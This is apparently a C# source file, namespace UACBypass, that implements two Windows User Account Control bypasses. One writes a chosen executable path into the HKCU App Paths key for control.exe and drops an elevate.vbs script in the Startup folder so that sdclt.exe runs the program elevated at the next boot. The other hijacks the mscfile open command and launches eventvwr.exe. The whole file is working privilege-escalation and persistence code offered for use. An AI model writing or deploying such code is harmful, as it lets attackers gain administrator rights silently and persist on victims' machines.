using Microsoft.Win32;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Linq;
using System.Reflection;
using System.Runtime.InteropServices;
using System.Security.Principal;
using System.Text;
using System.Threading;
using System.Threading.Tasks;

namespace UACBypass
{
    class BypassUAC
    {
        //It will help for self-elevate
        public static bool IsAdministrator
        {
            get
            {
                var identity = WindowsIdentity.GetCurrent();
                var principal = new WindowsPrincipal(identity);
                return principal.IsInRole(WindowsBuiltInRole.Administrator);
            }
        }
        //This method compatible with Windows 10 Newest Versions
        public static void AttemptNewMethod(string PathToElevate)
        {
            string startupPath = Path.Combine(Environment.GetFolderPath(Environment.SpecialFolder.Startup),"elevate.vbs");

            
            //Writing path to target registry key for hijack sdclt.exe 
            Registry.CurrentUser.CreateSubKey(@"Software\Microsoft\Windows\CurrentVersion\App Paths\control.exe")?.SetValue("", PathToElevate);

            //Somehow after this modification CreateProcess cant find sdclt path
            //Cmd and Powershell can run it because of those programs not using CreateProcess
            //And wont run it thought proxy method by the way this way it came easier to me ;)

            File.WriteAllText(startupPath, "CreateObject(\"WScript.Shell\").Run(\"sdclt\")");

            //Next boot-up process will be elevated
        }
        //This method work's with Windows 7 8 8.1 and older versions of Windows 10
        //Note : Process will not create window
        public static void AttempOldMethod(string procPath)
        {
            //Writing path to target registry key for hijack eventvwr.exe 
            Registry.CurrentUser.CreateSubKey(@"Software\Classes\mscfile\shell\open\command").SetValue("", procPath);
            Process.Start("eventvwr");
        }
    }
}
